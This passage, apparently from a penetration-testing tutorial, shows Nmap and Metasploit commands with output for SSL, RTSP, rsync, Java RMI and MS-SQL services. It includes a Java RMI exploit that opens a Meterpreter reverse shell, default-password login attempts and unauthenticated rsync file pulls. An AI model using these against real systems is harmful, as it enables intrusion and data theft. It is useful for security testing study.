</span><span class='line'>|       TLS_RSA_EXPORT_WITH_DES40_CBC_SHA - E
</span><span class='line'>|       TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 - E
</span><span class='line'>|       TLS_RSA_EXPORT_WITH_RC4_40_MD5 - E
</span><span class='line'>|       TLS_RSA_WITH_3DES_EDE_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_AES_128_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_AES_256_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_DES_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_RC4_128_MD5 - F
</span><span class='line'>|       TLS_RSA_WITH_RC4_128_SHA - F
</span><span class='line'>|     compressors: 
</span><span class='line'>|       NULL
</span><span class='line'>|     cipher preference: client
</span><span class='line'>|     warnings: 
</span><span class='line'>|       Ciphersuite uses MD5 for message integrity
</span><span class='line'>|       Insecure certificate signature: MD5
</span><span class='line'>|_  least strength: F
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.81 seconds</span></code></pre></td></tr></table></div></figure>
</li>


<li>
<a href="https://nmap.org/nsedoc/scripts/ssl-heartbleed.html">ssl-heartbleed.nse</a>: Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 443 --script ssl-heartbleed 223.30.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:35 IST
</span><span class='line'>Nmap scan report for 223.30.xx.xx
</span><span class='line'>Host is up (0.011s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>| ssl-heartbleed: 
</span><span class='line'>|   VULNERABLE:
</span><span class='line'>|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
</span><span class='line'>|     State: VULNERABLE
</span><span class='line'>|     Risk factor: High
</span><span class='line'>|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
</span><span class='line'>|           
</span><span class='line'>|     References:
</span><span class='line'>|       http://cvedetails.com/cve/2014-0160/
</span><span class='line'>|       http://www.openssl.org/news/secadv_20140407.txt 
</span><span class='line'>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li>
<a href="https://nmap.org/nsedoc/scripts/ssl-poodle.html">ssl-poodle.nse</a>: Checks whether SSLv3 CBC ciphers are allowed (POODLE). POODLE is CVE-2014-3566
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 443 --script ssl-poodle 223.30.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:40 IST
</span><span class='line'>Nmap scan report for 223.30.xx.xx
</span><span class='line'>Host is up (0.011s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>| ssl-poodle: 
</span><span class='line'>|   VULNERABLE:
</span><span class='line'>|   SSL POODLE information leak
</span><span class='line'>|     State: VULNERABLE
</span><span class='line'>|     IDs:  CVE:CVE-2014-3566  OSVDB:113251
</span><span class='line'>|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and
</span><span class='line'>|           other products, uses nondeterministic CBC padding, which makes it easier
</span><span class='line'>|           for man-in-the-middle attackers to obtain cleartext data via a
</span><span class='line'>|           padding-oracle attack, aka the "POODLE" issue.
</span><span class='line'>|     Disclosure date: 2014-10-14
</span><span class='line'>|     Check results:
</span><span class='line'>|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA
</span><span class='line'>|     References:
</span><span class='line'>|       https://www.openssl.org/~bodo/ssl-poodle.pdf
</span><span class='line'>|       http://osvdb.org/113251
</span><span class='line'>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
</span><span class='line'>|_      https://www.imperialviolet.org/2014/10/14/poodle.html</span></code></pre></td></tr></table></div></figure>

</li>
</ol>


<h3>RTSP | Port 554 and 8554</h3>

<p><strong>Nmap</strong> has two NSE for RTSP which are</p>

<ol>
<li>
<a href="https://nmap.org/nsedoc/scripts/rtsp-methods.html">rtsp-methods.nse</a> :which determines which methods are supported by the RTSP (real time streaming protocol) server
<br>
<br>
RTSP-Methods Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 8554 --script rtsp-methods 10.10.xx.xx -sV
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-01 23:17 IST
</span><span class='line'>Nmap scan report for 10.10.xx.xx (10.10.22.195)
</span><span class='line'>Host is up (0.015s latency).
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>8554/tcp open  rtsp    Geovision webcam rtspd
</span><span class='line'>|_rtsp-methods: OPTIONS, DESCRIBE, SETUP, PLAY, PAUSE, TEARDOWN
</span><span class='line'>Service Info: Device: webcam</span></code></pre></td></tr></table></div></figure>
</li>
<li><a href="https://nmap.org/nsedoc/scripts/rtsp-url-brute.html">rtsp-url-brute.nse</a> which Attempts to enumerate RTSP media URLS by testing for common paths on devices such as surveillance IP cameras.</li>
</ol>


<h3>Rsync | Port 873</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>services -p 873 -u -S rsync -R</span></code></pre></td></tr></table></div></figure>


<p><strong>Metasploit</strong> has</p>

<ol>
<li>
<strong>List Rsync Modules</strong>: An rsync module is essentially a directory share. These modules can optionally be protected by a password. This module connects to and negotiates with an rsync server, lists the available modules and,  optionally, determines if the module requires a password to access.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/rsync/modules_list
</span><span class='line'>services -p 873 -u -S rsync -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:873 - 5 rsync modules found: OTG DATA, Server IMP Backup, Rajan Data, test, testing
</span><span class='line'>[*] Scanned 1 of 4 hosts (25% complete)
</span><span class='line'>[*] 10.10.xx.xx:873 - no rsync modules found
</span><span class='line'>[*] Scanned 2 of 4 hosts (50% complete)
</span><span class='line'>[*] Scanned 3 of 4 hosts (75% complete)
</span><span class='line'>[*] Scanned 4 of 4 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>

<strong>Nmap</strong> has 

<ol>
<li> <a href="https://nmap.org/nsedoc/scripts/rsync-list-modules.html">rsync-list-modules.nse</a> : Lists modules available for rsync (remote file sync) synchronization.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 873 XX.XX.XX.52 --script=rsync-list-modules
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-06 00:05 IST
</span><span class='line'>Nmap scan report for XX.XX.243.52
</span><span class='line'>Host is up (0.0088s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>873/tcp open  rsync
</span><span class='line'>| rsync-list-modules: 
</span><span class='line'>|   mail              
</span><span class='line'>|   varlib            
</span><span class='line'>|   etc               
</span><span class='line'>|   net               
</span><span class='line'>|   dar               
</span><span class='line'>|   usrlocal          
</span><span class='line'>|   varlog            
</span><span class='line'>|   var               
</span><span class='line'>|_  root              
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds</span></code></pre></td></tr></table></div></figure>
</li>
</ol>

How to test your rsync setup:
<ol>
<li> List the available shares by running ( may require a password )
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsync rsync://share@your-ip-or-hostname/</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsync rsync://etc@XX.XX.XX.52
</span><span class='line'>mail              
</span><span class='line'>varlib            
</span><span class='line'>etc               
</span><span class='line'>net               
</span><span class='line'>dar               
</span><span class='line'>usrlocal          
</span><span class='line'>varlog            
</span><span class='line'>var               
</span><span class='line'>root              </span></code></pre></td></tr></table></div></figure>

<li>After entering your password, rsync should now give a file listing
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsync rsync://pub@your-ip-or-hostname/pub/</span></code></pre></td></tr></table></div></figure>
We may get access denied because of the IP address restrictions
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsync rsync://etc@XX.XX.XX.52/mail
</span><span class='line'>@ERROR: access denied to mail from unknown (XX.4.XX.XX)
</span><span class='line'>rsync error: error starting client-server protocol (code 5) at main.c(1653) [Receiver=3.1.1]</span></code></pre></td></tr></table></div></figure>
</li>

<li>Run: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsync -v --progress --partial rsync://pub@your-ip-or-hostname/pub/someFile </span></code></pre></td></tr></table></div></figure> (you can abbreviate --partial --progress as -P). Your file should now be downloading.
<li>Run:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsync -aPv rsync://pub@your-ip-or-hostname/pub/someDirectory .</span></code></pre></td></tr></table></div></figure>. Your directory should now be downloading
</ol>
</ol>


<h3>Java RMI | Port 1099</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>Java RMI Server Insecure Endpoint Code Execution Scanner</strong>: detects RMI endpoints:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/misc/java_rmi_server
</span><span class='line'>services -u -p 1099 -S Java -R</span></code></pre></td></tr></table></div></figure>
Failed output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 172.30.xx.xx:1099 Java RMI Endpoint Detected: Class Loader Disabled</span></code></pre></td></tr></table></div></figure>
Successful output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 192.168.xx.xx:1099 Java RMI Endpoint Detected: Class Loader Enabled</span></code></pre></td></tr></table></div></figure>
</li>
and then use
<li><strong>Java RMI Server Insecure Default Configuration Java Code Execution</strong>: This module takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process. RMI method calls do not support or require any sort of authentication

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use exploit/multi/misc/java_rmi_server</span></code></pre></td></tr></table></div></figure>

Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use exploit/multi/misc/java_rmi_server 
</span><span class='line'>msf exploit(java_rmi_server) &gt; set rhost 192.168.xx.xx
</span><span class='line'>rhost =&gt; 192.168.xx.xx
</span><span class='line'>msf exploit(java_rmi_server) &gt; run 
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.xx.xx:4444 
</span><span class='line'>[*] Using URL: http://0.0.xx.xx:8080/LAWVrAFTItH7N
</span><span class='line'>[*] Local IP: http://192.168.xx.xx:8080/LAWVrAFTItH7N
</span><span class='line'>[*] Server started.
</span><span class='line'>[*] 192.168.xx.xx:1099 - Sending RMI Header...
</span><span class='line'>[*] 192.168.xx.xx:1099 - Sending RMI Call...
</span><span class='line'>[*] 192.168.xx.xx     java_rmi_server - Replied to request for payload JAR
</span><span class='line'>[*] Sending stage (45741 bytes) to 192.168.xx.xx
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.xx.xx:4444 -&gt; 192.168.7.87:3899) at 2016-05-03 18:24:53 +0530
</span><span class='line'>[-] Exploit failed: RuntimeError Timeout HTTPDELAY expired and the HTTP Server didn't get a payload request
</span><span class='line'>[*] Server stopped.</span></code></pre></td></tr></table></div></figure>

Here's a video of Mubix exploiting it from  Metasploit Minute <a href="https://hak5.org/episodes/metasploit-minute/exploitation-using-java-rmi-service-metasploit-minute">Exploitation using java rmi service</a>
</li>
</ol>


<p><strong>Nmap</strong> has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/rmi-vuln-classloader.html">rmi-vuln-classloader.nse</a> Tests whether Java rmiregistry allows class loading. The default configuration of rmiregistry allows loading classes from remote URLs, which can lead to remote code execution. The vendor (Oracle/Sun) classifies this as a design feature.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script=rmi-vuln-classloader -p 1099 192.168.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-04 00:04 IST
</span><span class='line'>Nmap scan report for 192.168.xx.xx
</span><span class='line'>Host is up (0.0011s latency).
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>1099/tcp open  rmiregistry
</span><span class='line'>| rmi-vuln-classloader: 
</span><span class='line'>|   VULNERABLE:
</span><span class='line'>|   RMI registry default configuration remote code execution vulnerability
</span><span class='line'>|     State: VULNERABLE
</span><span class='line'>|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code executeion.
</span><span class='line'>|       
</span><span class='line'>|     References:
</span><span class='line'>|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
</span></code></pre></td></tr></table></div></figure></li>
</ol>


<h3>MS-SQL | Port 1433</h3>

<p><strong>MS-SQL</strong> is really vast multiple <strong>metasploit</strong> modules and blogs existing on the internet, Let&rsquo;s check <strong>Metasploit Modules</strong> one by one.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   auxiliary/admin/mssql/mssql_enum                                           normal     Microsoft SQL Server Configuration Enumerator
</span><span class='line'>   auxiliary/admin/mssql/mssql_enum_domain_accounts                           normal     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
</span><span class='line'>   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                      normal     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
</span><span class='line'>   auxiliary/admin/mssql/mssql_enum_sql_logins                                normal     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
</span><span class='line'>   auxiliary/admin/mssql/mssql_escalate_dbowner                               normal     Microsoft SQL Server Escalate Db_Owner
</span><span class='line'>   auxiliary/admin/mssql/mssql_escalate_dbowner_sqli                          normal     Microsoft SQL Server SQLi Escalate Db_Owner
</span><span class='line'>   auxiliary/admin/mssql/mssql_escalate_execute_as                            normal     Microsoft SQL Server Escalate EXECUTE AS
</span><span class='line'>   auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                       normal     Microsoft SQL Server SQLi Escalate Execute AS
</span><span class='line'>   auxiliary/admin/mssql/mssql_exec                                           normal     Microsoft SQL Server xp_cmdshell Command Execution
</span><span class='line'>   auxiliary/admin/mssql/mssql_findandsampledata                              normal     Microsoft SQL Server Find and Sample Data
</span><span class='line'>   auxiliary/admin/mssql/mssql_idf                                            normal     Microsoft SQL Server Interesting Data Finder
</span><span class='line'>   auxiliary/admin/mssql/mssql_ntlm_stealer                                   normal     Microsoft SQL Server NTLM Stealer
</span><span class='line'>   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                              normal     Microsoft SQL Server SQLi NTLM Stealer
</span><span class='line'>   auxiliary/admin/mssql/mssql_sql                                            normal     Microsoft SQL Server Generic Query
</span><span class='line'>   auxiliary/admin/mssql/mssql_sql_file                                       normal     Microsoft SQL Server Generic Query from File
</span><span class='line'>   auxiliary/analyze/jtr_mssql_fast                                           normal     John the Ripper MS SQL Password Cracker (Fast Mode)
</span><span class='line'>   auxiliary/gather/lansweeper_collector                                      normal     Lansweeper Credential Collector
</span><span class='line'>   auxiliary/scanner/mssql/mssql_hashdump                                     normal     MSSQL Password Hashdump
</span><span class='line'>   auxiliary/scanner/mssql/mssql_login                                        normal     MSSQL Login Utility
</span><span class='line'>   auxiliary/scanner/mssql/mssql_ping                                         normal     MSSQL Ping Utility
</span><span class='line'>   auxiliary/scanner/mssql/mssql_schemadump                                   normal     MSSQL Schema Dump</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s take</p>

<ol>
<li>
<strong>MSSQL Ping Utility</strong> which queries the MSSQL instance for information. This will also provide if any ms-sql is running on different ports. 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mssql/mssql_ping
</span><span class='line'>services -p 1433 -R</span></code></pre></td></tr></table></div></figure>
Sample output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] SQL Server information for 10.10.xx.xx:
</span><span class='line'>[+]    ServerName      = SAPBWBI
</span><span class='line'>[+]    InstanceName    = BOE140
</span><span class='line'>[+]    IsClustered     = No
</span><span class='line'>[+]    Version         = 10.0.xx.xx
</span><span class='line'>[+]    tcp             = 50623
</span><span class='line'>[+]    np              = \\SAPBWBI\pipe\MSSQL$BOE140\sql\query
</span><span class='line'>[*] SQL Server information for 10.10.xx.xx:
</span><span class='line'>[+]    ServerName      = MANGOOSE
</span><span class='line'>[+]    InstanceName    = MSSQLSERVER
</span><span class='line'>[+]    IsClustered     = No
</span><span class='line'>[+]    Version         = 11.0.xx.xx
</span><span class='line'>[+]    tcp             = 1433
</span><span class='line'>[*] SQL Server information for 10.10.xx.xx:
</span><span class='line'>[+]    ServerName      = MHE-DMP
</span><span class='line'>[+]    InstanceName    = MSSQLSERVER
</span><span class='line'>[+]    IsClustered     = No
</span><span class='line'>[+]    Version         = 11.0.xx.xx
</span><span class='line'>[+]    tcp             = 1433
</span><span class='line'>[*] SQL Server information for 10.10.xx.xx:
</span><span class='line'>[+]    ServerName      = MHE-DMP
</span><span class='line'>[+]    InstanceName    = MHE_DMP_LIVE
</span><span class='line'>[+]    IsClustered     = No
</span><span class='line'>[+]    Version         = 11.0.xx.xx
</span><span class='line'>[+]    tcp             = 53029</span></code></pre></td></tr></table></div></figure>
After discovering the ms-sql instances, we can check if their are any default passwords. 
</li>
<li>Let's use <strong>MSSQL Login Utility</strong> to find out if we have any default passwords. This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank) we always find default passwords such as company@123 etc. Once in an engagement, out of 200 Ms-sql instance we found around 60 default passwords. ;)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mssql/mssql_login
</span><span class='line'>set Password company@123
</span><span class='line'>services -p 1433 -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:1433 - MSSQL - Starting authentication scanner.
</span><span class='line'>[+] 10.10.xx.xx:1433 - LOGIN SUCCESSFUL: WORKSTATION\sa:company@123
</span><span class='line'>[-] 10.10.xx.xx:1433 MSSQL - LOGIN FAILED: WORKSTATION\sa:company@123 (Incorrect: )</span></code></pre></td></tr></table></div></figure>

Once, we have the credentials to the SQL Server we can use Microsoft SQL Server Configuration Enumerator by "Carlos Perez" 

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/admin/mssql/mssql_enum
</span><span class='line'>set rhost 10.10.xx.xx
</span><span class='line'>set password company@123</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
